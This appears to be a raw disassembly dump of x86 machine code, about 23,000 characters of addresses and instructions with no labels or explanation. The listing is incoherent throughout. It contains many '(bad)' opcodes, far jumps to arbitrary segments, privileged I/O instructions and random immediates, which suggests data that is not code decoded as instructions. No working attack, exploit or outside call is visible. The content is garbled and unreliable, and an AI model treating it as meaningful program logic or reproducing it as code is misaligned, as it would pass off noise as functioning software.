  422dde:	add    dh,BYTE PTR [edx+0x2e]
  422de1:	push   0x74
  422de3:	stc    
  422de4:	fimul  DWORD PTR [esi+0x189e5dce]
  422dea:	sbb    bl,BYTE PTR [esi-0x5f3f68f5]
  422df0:	xchg   edi,eax
  422df1:	sti    
  422df2:	sub    eax,0x83c616af
  422df7:	shr    edi,cl
  422df9:	lods   al,BYTE PTR ds:[esi]
  422dfa:	add    al,0xff
  422dfc:	cmp    al,0xb0
  422dff:	xchg   esi,eax
  422e00:	(bad)  
  422e01:	jmp    0x422e25
  422e03:	fistp  QWORD PTR [esp+edi*8-0x672cea66]
  422e0a:	xor    eax,0x3da48949
  422e0f:	sbb    al,0x2
  422e11:	sbb    BYTE PTR [esi+0x3694b912],dh
  422e17:	test   al,0x3f
  422e19:	test   BYTE PTR [edi-0x40],bl
  422e1c:	add    eax,0x511a7ac9
  422e21:	xor    dh,dh
  422e23:	fcomp  QWORD PTR [esi-0x1e]
  422e26:	mov    eax,ds:0x6327776f
  422e2b:	mov    edx,0xe2ea19ba
  422e30:	mov    DWORD PTR [esi],esp
  422e32:	pop    ecx
  422e33:	das    
  422e34:	cli    
  422e35:	fnstsw WORD PTR [eax+edi*8]
  422e38:	scas   eax,DWORD PTR es:[edi]
  422e39:	or     BYTE PTR [ecx*4-0x2fc24bce],dl
  422e40:	mov    bh,0x4f
  422e42:	in     al,0x67
  422e44:	mov    esp,0x38be20db
  422e49:	in     eax,dx
  422e4a:	dec    ebx
  422e4b:	das    
  422e4c:	add    BYTE PTR [esi],dh
  422e4e:	or     edi,edi
  422e50:	rcr    bl,cl
  422e52:	scas   al,BYTE PTR es:[edi]
  422e53:	inc    ebx
  422e54:	or     al,0xae
  422e56:	mov    ah,0x87
  422e58:	lahf   
  422e59:	xchg   esp,eax
  422e5a:	shl    DWORD PTR [ebx+0x703e95a8],cl
  422e60:	inc    esp
  422e61:	(bad)  
  422e62:	mov    dh,0x3e
  422e64:	clc    
  422e65:	data16 jge 0x422df7
  422e68:	push   eax
  422e69:	or     bl,BYTE PTR [ecx+0x28]
  422e6c:	inc    edx
  422e6d:	fcmovne st,st(7)
  422e6f:	pop    edi
  422e70:	jg     0x422e5a
  422e72:	push   ss
  422e73:	and    eax,0x64525967
  422e78:	push   0x414ad354
  422e7d:	pop    esp
  422e7e:	lds    ecx,FWORD PTR [edi]
  422e80:	inc    esi
  422e81:	jmp    0xf984:0x37a2a545
  422e88:	dec    eax
  422e89:	push   esi
  422e8a:	xor    eax,0x574c999e
  422e8f:	push   es
  422e90:	aas    
  422e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e92:	lds    eax,FWORD PTR [edi-0x552b4a19]
  422e98:	mov    ss,ebx
  422e9a:	dec    eax
  422e9b:	add    bh,BYTE PTR [ebp-0x45aeeb00]
  422ea1:	repz gs fs jmp 0x2c34:0x7674e705
  422eab:	and    ecx,DWORD PTR [edi]
  422ead:	dec    esp
  422eae:	addr16 jmp 0x422e68
  422eb1:	(bad)  
  422eb2:	std    
  422eb3:	mov    esp,0xf07d5301
  422eb8:	adc    esp,ebx
  422eba:	imul   esp,DWORD PTR [ecx-0xd],0x5b1da1a4
  422ec1:	push   cs
  422ec2:	ret    0x4200
  422ec5:	test   bl,bl
  422ec7:	mov    fs,WORD PTR [esi+eax*1-0x1a7bce1c]
  422ece:	sti    
  422ecf:	in     al,0x6e
  422ed1:	imul   esp,DWORD PTR [eax*2+0x22c5e587],0xba84464e
  422edc:	pop    ecx
  422edd:	mov    es,WORD PTR [ebx-0x7ace878d]
  422ee3:	(bad)  
  422ee4:	jl     0x422f18
  422ee6:	shl    DWORD PTR [esp+ecx*2-0x66f7a731],0xb7
  422eee:	xchg   esp,eax
  422eef:	mov    ebp,0x227af966
  422ef4:	aaa    
  422ef5:	jno    0x422f4a
  422ef7:	sub    dx,ax
  422efa:	pop    eax
  422efb:	mov    bh,0xd5
  422efd:	out    0x72,al
  422eff:	mov    esp,0x43c09741
  422f04:	ja     0x422f48
  422f06:	push   ebx
  422f07:	fstp   QWORD PTR [esi+0x6f]
  422f0a:	xor    al,0x0
  422f0c:	sub    edi,edx
  422f0e:	stos   DWORD PTR es:[edi],eax
  422f0f:	and    ah,BYTE PTR [ebp+0x22029907]
  422f15:	push   esi
  422f16:	repz aaa 
  422f18:	fsub   st,st(0)
  422f1a:	sbb    eax,0x7e17bc98
  422f1f:	push   0x56
  422f21:	int3   
  422f22:	sub    BYTE PTR [ecx],ah
  422f24:	lahf   
  422f25:	adc    DWORD PTR [ecx],edx
  422f27:	lahf   
  422f28:	add    al,BYTE PTR [edx-0x5c2b7c26]
  422f2e:	sub    DWORD PTR [esi+0x2d5e5ad1],0x738a0ec0
  422f38:	ret    0x6227
  422f3b:	and    ebp,DWORD PTR [ebx+0x6]
  422f3e:	enter  0xf5e1,0xd2
  422f42:	das    
  422f43:	cmp    DWORD PTR [eax],eax
	...
  422f51:	add    dh,BYTE PTR [ebx]
  422f53:	mov    edi,DWORD PTR [eax]
  422f55:	mov    ebx,0xb63bb3b8
  422f5a:	fsubp  st(3),st
  422f5c:	mov    bh,0x86
  422f5e:	mov    ebx,0xa7c73535
  422f63:	add    DWORD PTR [eax],eax
  422f65:	stos   DWORD PTR es:[edi],eax
  422f66:	add    eax,DWORD PTR [eax]
  422f68:	add    BYTE PTR [ebp+0x67],ch
  422f6b:	scas   eax,DWORD PTR es:[edi]
  422f6c:	inc    esp
  422f6d:	out    0xe2,al
  422f6f:	jle    0x422fc6
  422f71:	cmp    bl,bl
  422f73:	adc    BYTE PTR [esi-0x7710a18],bl
  422f79:	sbb    DWORD PTR [edi+0x2961a6aa],ebp
  422f7f:	pop    ebx
  422f80:	ret    0xd41d
  422f83:	ret    0x568c
  422f86:	mov    eax,0x6a9a376c
  422f8b:	pop    ds
  422f8c:	ret    
  422f8d:	jp     0x422fb8
  422f8f:	xor    ecx,ecx
  422f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f92:	inc    ecx
  422f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f94:	rol    dl,1
  422f96:	inc    edi
  422f97:	cdq    
  422f98:	add    BYTE PTR [bx-0xf79],bh
  422f9d:	pushf  
  422f9e:	in     al,dx
  422f9f:	push   edi
  422fa0:	cld    
  422fa1:	loopne 0x42300f
  422fa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fa4:	jo     0x422f5c
  422fa6:	out    dx,al
  422fa7:	adc    edx,DWORD PTR fs:[esi]
  422faa:	cmp    ebx,DWORD PTR [edi+0x3d1b59a9]
  422fb0:	mov    dh,BYTE PTR [ecx]
  422fb2:	retf   0x93f4
  422fb5:	and    bh,BYTE PTR [edx-0x76]
  422fb8:	bound  esp,QWORD PTR [ebp-0x80]
  422fbb:	aad    0xef
  422fbd:	pop    edx
  422fbe:	xor    al,0x45
  422fc0:	cwde   
  422fc1:	mov    eax,ds:0xc392b5b1
  422fc6:	sub    bh,BYTE PTR ds:0x6c9cd90a
  422fcc:	fdivr  st(5),st
  422fce:	or     esp,DWORD PTR [esi+0x349adf90]
  422fd4:	test   BYTE PTR [eax+ecx*2],0x27
  422fd8:	fnstsw WORD PTR gs:[ebx]
  422fdb:	or     BYTE PTR [esi+0x35],dl
  422fde:	pop    ds
  422fdf:	jmp    0x901af1ba
  422fe4:	cmp    DWORD PTR [esi*2-0x579e74f1],esi
  422feb:	xchg   esi,eax
  422fec:	sahf   
  422fed:	mov    eax,ds:0x313b6da2
  422ff2:	mov    edx,0xbefbe307
  422ff7:	in     al,dx
  422ff8:	and    al,0x44
  422ffa:	lods   al,BYTE PTR ds:[esi]
  422ffb:	sbb    dh,cl
  422ffd:	inc    ecx
  422ffe:	cmp    esp,DWORD PTR [edi]
  423000:	or     ebp,DWORD PTR [esi-0x3f]
  423003:	mov    eax,0x70c2a554
  423008:	adc    al,0x23
  42300a:	pop    esi
  42300b:	xor    edx,DWORD PTR [edi+0x16]
  42300e:	or     ecx,DWORD PTR [eax]
  423010:	imul   edx,DWORD PTR [ebx-0x7831a206],0xffffffbd
  423017:	pop    ss
  423018:	fwait
  423019:	or     BYTE PTR [ebp+0x62eb0ea6],cl
  42301f:	xor    cl,BYTE PTR [ebx-0x50]
  423022:	imul   esi,DWORD PTR [edi],0xffffffe8
  423025:	xor    eax,0xc2d0b044
  42302a:	push   ss
  42302b:	div    DWORD PTR [edi]
  42302d:	mov    ch,0x80
  42302f:	fs pop ebp
  423031:	mov    eax,ds:0x24971b6a
  423036:	dec    edi
  423037:	(bad)  
  423038:	jge    0x423009
  42303a:	imul   ebp,DWORD PTR [ebx],0x60ac4b3e
  423040:	retf   0xf0da
  423043:	or     esp,ecx
  423045:	dec    eax
  423046:	mov    eax,0x5b6b7d3e
  42304b:	push   ebx
  42304c:	add    edi,esi
  42304e:	(bad)  [esi+0x7d]
  423051:	or     ebx,edi
  423053:	lds    ebx,FWORD PTR [edi]
  423055:	push   ds
  423056:	xchg   BYTE PTR [ebx+0x7c],bl
  423059:	sub    dl,al
  42305b:	mov    ecx,0xe40a0583
  423060:	mov    eax,0x17565504
  423065:	pop    esi
  423066:	repz repz xor al,0x0
  42306a:	loopne 0x423084
  42306c:	je     0x423020
  42306e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42306f:	aam    0x2c
  423071:	inc    esp
  423072:	out    dx,eax
  423073:	jns    0x4230a2
  423075:	test   edx,edi
  423077:	out    dx,al
  423078:	mov    ebp,0x9a8f9d5
  42307d:	jae    0x4230d7
  42307f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423080:	int    0x3d
  423082:	shl    DWORD PTR ds:0x8dbba598,0x34
  423089:	mov    dl,0x32
  42308b:	dec    esp
  42308c:	popa   
  42308d:	pop    eax
  42308e:	xchg   esp,eax
  42308f:	das    
  423090:	and    al,0xd8
  423092:	fsubr  QWORD PTR [esi-0xf48888e]
  423098:	stc    
  423099:	loopne 0x42303a
  42309b:	pop    esi
  42309c:	retf   0xdbcf
  42309f:	mov    bh,BYTE PTR [eax+0x70409c28]
  4230a5:	adc    BYTE PTR [edi],ah
  4230a7:	in     al,dx
  4230a8:	push   ebp
  4230a9:	cmp    edi,DWORD PTR [edx-0x64fa188c]
  4230af:	pop    esp
  4230b0:	int    0xd4
  4230b2:	les    ebx,FWORD PTR [ebp-0xccee1b6]
  4230b8:	cmp    DWORD PTR [edi-0x5107a638],esp
  4230be:	mov    ds:0x53837feb,eax
  4230c3:	es xor eax,0x288c871d
  4230c9:	int3   
  4230ca:	mov    ch,0x9b
  4230cc:	xor    eax,0xc5f1857e
  4230d1:	adc    BYTE PTR [ebx],ah
  4230d3:	push   es
  4230d4:	pusha  
  4230d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230d6:	cs into 
  4230d8:	hlt    
  4230d9:	daa    
  4230da:	aad    0xf6
  4230dc:	inc    ebx
  4230dd:	xor    DWORD PTR [eax-0x68],esi
  4230e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230e1:	enter  0xbba2,0xc2
  4230e5:	jno    0x42310a
  4230e7:	in     eax,0x5e
  4230e9:	add    eax,0x4909e17c
  4230ee:	jnp    0x423126
  4230f0:	pop    ss
  4230f1:	repz mov ah,0xb7
  4230f4:	jecxz  0x42309d
  4230f6:	jmp    0x42316b
  4230f8:	adc    DWORD PTR [edi],esi
  4230fa:	cli    
  4230fb:	xor    BYTE PTR [eax+0x34],bl
  4230fe:	fild   QWORD PTR [edx+edi*8+0x643be314]
  423105:	xchg   ebp,esi
  423107:	nop
  423108:	fwait
  423109:	xchg   ebp,eax
  42310a:	adc    eax,0x46585211
  42310f:	mov    DWORD PTR [edi-0x61],edx
  423112:	(bad)  
  423113:	jp     0x423130
  423115:	sbb    dl,BYTE PTR [ebx-0x31]
  423118:	push   ss
  423119:	out    dx,eax
  42311a:	inc    esp
  42311b:	sahf   
  42311c:	(bad)  
  42311d:	mov    edx,0x71b91f95
  423122:	les    eax,FWORD PTR [esi-0x784fa7eb]
  423128:	add    BYTE PTR [edi],ah
  42312a:	ret    0x53ab
  42312d:	dec    eax
  42312e:	inc    ecx
  42312f:	rcl    BYTE PTR [edx-0x334f0043],1
  423135:	jne    0x4230f5
  423137:	aaa    
  423138:	vrsqrtss xmm1,xmm6,xmm0
  42313c:	jbe    0x423103
  42313e:	lods   eax,DWORD PTR ds:[esi]
  42313f:	push   esp
  423140:	imul   edi,DWORD PTR [eax-0x45],0xb42193ff
  423147:	adc    al,0x40
  423149:	or     DWORD PTR [esi],edi
  42314b:	in     al,dx
  42314c:	push   ss
  42314d:	(bad)
  423150:	out    0xb2,eax
  423152:	into   
  423153:	data16 sub BYTE PTR gs:[ecx],al
  423157:	xchg   edi,eax
  423158:	dec    eax
  423159:	push   DWORD PTR [ebx]
  42315b:	sub    bl,BYTE PTR [edi]
  42315d:	fiadd  WORD PTR [ebx]
  42315f:	aam    0xe4
  423161:	xchg   esp,eax
  423162:	ror    ch,cl
  423164:	ss xchg edi,eax
  423166:	xor    eax,0x1fef1f42
  42316b:	mov    esi,0xc46824b9
  423170:	xor    DWORD PTR [esi+0x6a],edi
  423173:	push   eax
  423174:	test   BYTE PTR [edx-0x31],cl
  423177:	cmp    al,0xbc
  423179:	mov    bh,BYTE PTR [edx+0x357f0e9c]
  42317f:	sar    BYTE PTR [ebp+0x4],0x7b
  423183:	call   0x51ad95fe
  423188:	or     ebx,eax
  42318a:	push   ebx
  42318b:	loope  0x42314c
  42318d:	xchg   BYTE PTR [esi],bl
  42318f:	mov    bl,0x24
  423191:	push   es
  423192:	ret    
  423193:	out    0x83,al
  423195:	retf   0x738d
  423198:	push   ebp
  423199:	scas   al,BYTE PTR es:[edi]
  42319a:	in     eax,0x8a
  42319c:	push   edx
  42319d:	test   al,0xa9
  42319f:	xchg   DWORD PTR [eax],ebp
  4231a1:	adc    eax,0xf703518c
  4231a6:	pusha  
  4231a7:	scas   al,BYTE PTR es:[edi]
  4231a8:	loope  0x423197
  4231aa:	mov    ds:0x514f6451,al
  4231af:	jmp    0x336f:0xaf5c1fe2
  4231b6:	adc    BYTE PTR [ecx+0x27],dh
  4231b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231ba:	cmp    ch,BYTE PTR [edx+0x3895e241]
  4231c0:	push   ecx
  4231c1:	pop    ds
  4231c2:	add    ebp,ecx
  4231c4:	add    esi,DWORD PTR [eax+0x2c89c31a]
  4231ca:	dec    ebx
  4231cb:	push   edi
  4231cc:	push   ebx
  4231cd:	or     DWORD PTR [ebp-0x31],0xffffff8f
  4231d1:	lods   eax,DWORD PTR ds:[esi]
  4231d2:	xchg   BYTE PTR [edi+0x3bd0eb7a],dh
  4231d8:	jmp    0x42321f
  4231da:	pop    ebp
  4231db:	add    DWORD PTR [eax+0x2c841e57],edx
  4231e1:	(bad)  
  4231e2:	fidiv  DWORD PTR [edi-0x32]
  4231e5:	and    BYTE PTR [esi],ah
  4231e7:	out    dx,al
  4231e8:	dec    ebx
  4231e9:	ins    DWORD PTR es:[edi],dx
  4231ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231eb:	inc    esi
  4231ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231ed:	sbb    al,bh
  4231ef:	dec    ebp
  4231f0:	and    eax,0xe7e272a9
  4231f5:	pushf  
  4231f6:	mov    ebx,DWORD PTR [ebx-0x29c63abb]
  4231fc:	outs   dx,DWORD PTR ds:[esi]
  4231fd:	add    edx,ebp
  4231ff:	into   
  423200:	je     0x42320a
  423202:	add    bl,BYTE PTR [edi-0x61]
  423205:	mov    DWORD PTR [edx+0x2723df8a],ecx
  42320b:	inc    edx
  42320c:	mov    ch,0x4f
  42320e:	xlat   BYTE PTR ds:[ebx]
  42320f:	push   ebx
  423210:	jle    0x4231d8
  423212:	or     ch,dl
  423214:	sub    eax,0x8ca4b9a3
  423219:	retf   
  42321a:	sbb    esp,edi
  42321c:	jp     0x42322b
  42321e:	and    BYTE PTR [edi],0x12
  423221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423222:	clc    
  423223:	ss js  0x423220
  423226:	das    
  423227:	in     eax,0x19
  423229:	mov    dl,0xd
  42322b:	or     eax,0x1f5b3598
  423230:	aad    0x25
  423232:	ins    BYTE PTR es:[edi],dx
  423233:	xchg   edx,eax
  423234:	mov    cl,0x72
  423236:	imul   BYTE PTR [esi+0x6eca8d2b]
  42323c:	imul   ecx,DWORD PTR [ebx+ebx*1],0x9b0a096e
  423243:	sub    ah,0xec
  423246:	frstor [edi+ebx*1]
  423249:	push   eax
  42324a:	div    DWORD PTR [edx-0x15]
  42324d:	fisttp QWORD PTR [esi+0x1905dd9d]
  423253:	popa   
  423254:	(bad)  
  423255:	rcl    DWORD PTR [ecx],cl
  423257:	jmp    0x56e2:0xe83fac7e
  42325e:	(bad)  
  423260:	out    0x6a,al
  423262:	sbb    al,0xc6
  423264:	dec    ecx
  423265:	dec    ecx
  423266:	sahf   
  423267:	aaa    
  423268:	add    ebx,ecx
  42326a:	ret    
  42326b:	or     edi,DWORD PTR [esi-0x6decaf34]
  423271:	and    BYTE PTR [edi+0x31d9cf66],0x55
  423278:	imul   edx,DWORD PTR [ecx+0x52465432],0x1f
  42327f:	jmp    0x73e97a5b
  423284:	cld    
  423285:	mov    bl,0x3
  423287:	adc    DWORD PTR [ecx-0xe],0xffffffdf
  42328b:	fisttp QWORD PTR [edx+0x7d71fcff]
  423291:	pop    esp
  423292:	and    DWORD PTR [eax],ecx
  423294:	mov    dl,0x5e
  423296:	lods   al,BYTE PTR ds:[esi]
  423297:	and    al,0x2e
  423299:	ret    0x9c2a
  42329c:	call   DWORD PTR [ebp-0x64]
  42329f:	(bad)  
  4232a0:	sub    eax,0xa24e4850
  4232a5:	test   eax,0x3b64ce5c
  4232aa:	dec    edx
  4232ab:	xor    al,ah
  4232ad:	xchg   edx,eax
  4232ae:	cs cld 
  4232b0:	or     bl,BYTE PTR [ecx-0x2b19db0c]
  4232b6:	mov    cl,bl
  4232b8:	sbb    ah,BYTE PTR [ebp-0x17]
  4232bb:	in     eax,0xda
  4232bd:	sti    
  4232be:	sub    al,0xde
  4232c0:	test   DWORD PTR [ecx-0x7402349f],eax
  4232c6:	jp     0x4232ce
  4232c8:	add    dh,0x97
  4232cb:	pop    esi
  4232cc:	arpl   di,si
  4232ce:	mov    ebp,DWORD PTR [ebx-0x4d7e37a7]
  4232d4:	pushf  
  4232d5:	(bad)  
  4232d6:	popa   
  4232d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232d8:	mov    dl,0xa
  4232da:	ins    BYTE PTR es:[edi],dx
  4232db:	fbld   TBYTE PTR [edx]
  4232dd:	mov    edi,0x9c6ea640
  4232e2:	lods   eax,DWORD PTR ds:[esi]
  4232e3:	add    bl,BYTE PTR [ebp-0x54e8767]
  4232e9:	push   es
  4232ea:	cmp    ch,ch
  4232ec:	sbb    edx,eax
  4232ee:	sbb    esi,DWORD PTR [edi]
  4232f0:	adc    eax,0x2909db7d
  4232f5:	hlt    
  4232f6:	(bad)  
  4232f7:	int3   
  4232f8:	test   BYTE PTR [ebx-0x7d],dh
  4232fb:	rcr    BYTE PTR [edx],1
  4232fd:	mov    edx,0x795b7a8a
  423302:	jg     0x423362
  423304:	test   eax,0x810bd0f5
  423309:	mov    edx,0x17b9580b
  42330e:	adc    edx,esi
  423310:	mov    dl,0x5b
  423312:	mov    ebp,0xbd
	...
  42331f:	add    BYTE PTR [eax],al
  423321:	cli    
  423322:	dec    esp
  423323:	push   es
  423324:	ret    
  423325:	mov    dh,0xcb
  423327:	(bad)  
  423328:	jge    0x423393
  42332a:	cmp    ah,BYTE PTR [edi]
  42332c:	in     al,0xcf
  42332e:	xchg   BYTE PTR [edi+0x1ab72c2],bh
  423334:	add    BYTE PTR [ebx-0x73fffffd],ch
  42333a:	adc    esi,ecx
  42333c:	popf   
  42333d:	in     al,dx
  42333e:	sub    BYTE PTR [ebx],cl
  423340:	fs cmp al,0x48
  423343:	imul   esi,DWORD PTR ds:0xabf84e08,0x4280b526
  42334d:	lahf   
  42334e:	jne    0x423394
  423350:	dec    ecx
  423351:	add    eax,0xab2422e6
  423356:	push   ebp
  423357:	mov    ds:0x9420c4d4,eax
  42335c:	es pop edx
  42335e:	arpl   WORD PTR [eax+0x79ec90d2],bp
  423364:	dec    esi
  423365:	jmp    0x423373
  423367:	call   0xfb704c60
  42336c:	int3   
  42336d:	ja     0x4233ce
  42336f:	xchg   edi,eax
  423370:	jge    0x42338d
  423372:	cmp    BYTE PTR [ecx],0xc4
  423375:	push   ebx
  423376:	sbb    ah,BYTE PTR [esi-0x1a]
  423379:	inc    ebp
  42337a:	xor    al,0xd2
  42337c:	mov    al,ds:0x4b2f1ee5
  423381:	adc    bl,BYTE PTR [esi-0x2c3e447f]
  423387:	out    dx,al
  423388:	mov    cl,0x15
  42338a:	call   0x3f76334a
  42338f:	rol    BYTE PTR [ebx-0x13],0xf4
  423393:	cmp    DWORD PTR [ecx+eax*8+0x7583e2ba],ebp
  42339a:	shl    DWORD PTR [esi-0x54],1
  42339d:	imul   ebx,DWORD PTR [ebp+edx*2+0x2554eb4],0xa4978232
  4233a8:	mov    cl,0x9d
  4233aa:	mov    al,0x21
  4233ac:	pusha  
  4233ad:	lods   eax,DWORD PTR ds:[esi]
  4233ae:	sub    ebx,DWORD PTR [ecx]
  4233b0:	int3   
  4233b1:	inc    esp
  4233b2:	sbb    DWORD PTR ds:0x3cde3cf6,edx
  4233b8:	out    0x33,eax
  4233ba:	dec    ebx
  4233bb:	pop    ebp
  4233bc:	nop
  4233bd:	or     dl,BYTE PTR [ecx+esi*1+0x15ac62f0]
  4233c4:	(bad)  
  4233c5:	pop    ss
  4233c6:	and    al,0xc7
  4233c8:	adc    esp,ecx
  4233ca:	fisub  DWORD PTR [ecx-0xc4c1e02]
  4233d0:	add    BYTE PTR [ebp-0x23],0x5a
  4233d4:	repz fisttp QWORD PTR ds:0x90a7724e
  4233db:	retf   
  4233dc:	fstp   QWORD PTR [ebx-0x724b28aa]
  4233e2:	push   es
  4233e3:	mov    bl,0x93
  4233e5:	mov    DWORD PTR [ebx+0x31],0x4aa76711
  4233ec:	mov    cl,0x71
  4233ee:	outs   dx,BYTE PTR ds:[esi]
  4233ef:	sub    al,0x76
  4233f1:	call   0x58044600
  4233f6:	sar    BYTE PTR [esi+eiz*2],0xc7
  4233fa:	pusha  
  4233fb:	sbb    dl,ch
  4233fd:	mov    cl,0x2e
  4233ff:	jo     0x42345e
  423401:	pop    esp
  423402:	add    DWORD PTR [ebx+ecx*1-0x32],ebx
  423406:	dec    eax
  423407:	ds mov ch,0x3
  42340a:	adc    ch,BYTE PTR [edi+0x288ce44e]
  423410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423411:	dec    eax
  423412:	aaa    
  423413:	fld    QWORD PTR [esi]
  423415:	inc    eax
  423416:	push   cs
  423417:	lahf   
  423418:	mov    ecx,0x6d66f07e
  42341d:	sub    dh,dl
  42341f:	setge  BYTE PTR [edx+0x76]
  423423:	xor    edi,DWORD PTR [ebx+edi*8]
  423426:	ja     0x42340a
  423428:	dec    ebx
  423429:	mov    al,0xce
  42342b:	fiadd  WORD PTR [esi+ebp*4]
  42342e:	sahf   
  42342f:	pusha  
  423430:	fstp   DWORD PTR [esi+eiz*2-0x36]
  423434:	xchg   ebp,eax
  423435:	or     bh,ah
  423437:	retf   0xed01
  42343a:	out    dx,al
  42343b:	in     al,dx
  42343c:	in     eax,dx
  42343d:	sti    
  42343e:	in     al,0x13
  423440:	rol    DWORD PTR [edi+edx*2-0x1a],1
  423444:	inc    eax
  423445:	daa    
  423446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423447:	xor    esp,ebx
  423449:	mov    dl,0x40
  42344b:	rcr    ebx,0xc2
  42344e:	add    esi,ebp
  423450:	loope  0x423444
  423452:	sbb    bh,BYTE PTR [eax-0x22fd3f1f]
  423458:	(bad)  
  423459:	jb     0x4234b9
  42345b:	arpl   WORD PTR [edi-0x4cfecc0b],bp
  423461:	jg     0x4234bf
  423463:	xor    ecx,eax
  423465:	test   eax,0x528bd2b9
  42346a:	clc    
  42346b:	xor    ch,BYTE PTR [ebp+0x1c]
  42346e:	pusha  
  42346f:	into   
  423470:	sbb    al,0xe0
  423472:	xchg   cl,cl
  423474:	outs   dx,DWORD PTR ds:[esi]
  423475:	fcmovnbe st,st(1)
  423477:	cmp    DWORD PTR [edx-0x15f4e57a],0x61fb54d2
  423481:	xor    bh,BYTE PTR [edi-0x5152b81]
  423487:	pop    ebx
  423488:	cmc    
  423489:	pop    ebp
  42348a:	data16 or BYTE PTR [ebp-0x459bb9d5],dl
  423491:	dec    esp
  423492:	or     al,0x2d
  423494:	jl     0x4234db
  423496:	sbb    eax,0x1c9160f1
  42349b:	jnp    0x423430
  42349d:	pop    esp
  42349e:	mov    esi,0x49dc3342
  4234a3:	inc    esp
  4234a4:	icebp  
  4234a5:	pop    ebp
  4234a6:	sbb    ch,0xa4
  4234a9:	jbe    0x4234cc
  4234ab:	mov    fs,WORD PTR [ebx+0x341d99f8]
  4234b1:	stos   BYTE PTR es:[edi],al
  4234b2:	data16 (bad) 
  4234b5:	mov    dl,0x48
  4234b8:	dec    ecx
  4234b9:	sbb    al,0xc9
  4234bb:	(bad)  
  4234bc:	ja     0x423461
  4234be:	retf   
  4234bf:	sub    eax,0xaec9a10e
  4234c4:	popa   
  4234c5:	mov    dl,0x98
  4234c7:	inc    esp
  4234c8:	sbb    ebp,DWORD PTR [eax-0x44]
  4234cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234cc:	push   cs
  4234cd:	(bad)  
  4234ce:	sub    dh,BYTE PTR [ecx+ebx*8-0x2014497c]
  4234d5:	push   ecx
  4234d6:	mov    dl,0x29
  4234d8:	pop    ss
  4234d9:	imul   esp,DWORD PTR [edi-0x255c37a5],0x9961144d
  4234e3:	cmp    esp,DWORD PTR [ecx-0xff28640]
  4234e9:	jno    0x42352a
  4234eb:	(bad)  
  4234ed:	cli    
  4234ee:	pop    ebp
  4234ef:	jnp    0x423515
  4234f1:	jnp    0x4234e7
  4234f3:	sbb    eax,0xccc1176c
  4234f8:	out    dx,eax
  4234f9:	cmp    al,0x84
  4234fb:	push   0x1f
  4234fd:	mov    WORD PTR [esi+0x1],?
  423500:	pop    ss
  423501:	loope  0x423523
  423503:	xchg   ebx,eax
  423504:	jge    0x42353e
  423506:	out    dx,al
  423507:	mov    bh,0x52
  423509:	test   DWORD PTR [ebx],0x17d649e5
  42350f:	mov    ebx,0xfc245014
  423514:	in     al,0x72
  423516:	(bad)  [eax-0x45d24346]
  42351c:	jl     0x4234c0
  42351e:	lds    ebp,FWORD PTR ds:0x285ae548
  423524:	xchg   esi,eax
  423525:	jmp    0x42354f
  423527:	loope  0x4234e0
  423529:	arpl   WORD PTR [edi+0x61],si
  42352c:	leave  
  42352d:	scas   al,BYTE PTR es:[edi]
  42352e:	clc    
  42352f:	outs   dx,DWORD PTR ds:[esi]
  423530:	imul   edi,DWORD PTR [edx],0x63
  423533:	mov    cl,0xdb
  423535:	fnsave [esi+0x7c661f5b]
  42353b:	xchg   esp,eax
  42353c:	enter  0x1d80,0xb9
  423540:	movups XMMWORD PTR [ebx+ecx*2+0x3d],xmm5
  423545:	(bad)  
  423546:	mov    ss,WORD PTR [ecx+eax*1+0x740c9c51]
  42354d:	mov    al,ds:0x1ae938f2
  423552:	push   ebp
  423553:	mov    dh,0xf7
  423555:	lods   eax,DWORD PTR ds:[esi]
  423556:	das    
  423557:	xchg   DWORD PTR [ecx],edx
  423559:	clc    
  42355a:	int3   
  42355b:	jb     0x423574
  42355d:	and    eax,DWORD PTR [ecx-0x6c]
  423560:	or     eax,0xa9b5ce0c
  423565:	xchg   ecx,eax
  423566:	pop    ecx
  423567:	add    ah,BYTE PTR [eax+0x3f7422da]
  42356d:	in     eax,0x3d
  42356f:	retf   
  423570:	cmp    bh,BYTE PTR [edx]
  423572:	mov    al,ds:0xb33e2ad1
  423577:	jnp    0x423553
  423579:	popa   
  42357a:	aad    0x9f
  42357c:	out    0x7c,eax
  42357e:	mov    edi,0x8264612d
  423583:	lahf   
  423584:	loop   0x4235fc
  423586:	dec    edi
  423587:	pusha  
  423588:	loopne 0x42351a
  42358a:	mov    ch,0x64
  42358c:	xchg   ebp,eax
  42358d:	sub    bl,BYTE PTR [eax+0x16]
  423590:	in     eax,dx
  423591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423592:	aas    
  423593:	add    bl,dl
  423595:	out    dx,al
  423596:	or     edx,DWORD PTR [edx+eiz*2]
  423599:	adc    DWORD PTR [edi-0x8db9abe],edx
  42359f:	sub    BYTE PTR [ebx-0x365c0846],ah
  4235a5:	loopne 0x42357b
  4235a7:	mov    cl,0xcb
  4235a9:	dec    ecx
  4235aa:	repz inc ebp
  4235ac:	dec    eax
  4235ad:	ds je  0x4235ce
  4235b0:	mov    ebx,0xdade00fc
  4235b5:	rol    BYTE PTR [ebx-0x52],cl
  4235b8:	jge    0x4235f5
  4235ba:	movntps XMMWORD PTR [ebx+0x7769da57],xmm2
  4235c1:	xor    BYTE PTR [ebx+ecx*1-0x2faebd98],dh
  4235c8:	add    eax,0x121210a5
  4235cd:	push   0x99a2fa7d
  4235d2:	outs   dx,DWORD PTR ds:[esi]
  4235d3:	mov    bp,0x9357
  4235d7:	fstp   DWORD PTR [esi-0x6d2233bd]
  4235dd:	inc    ebp
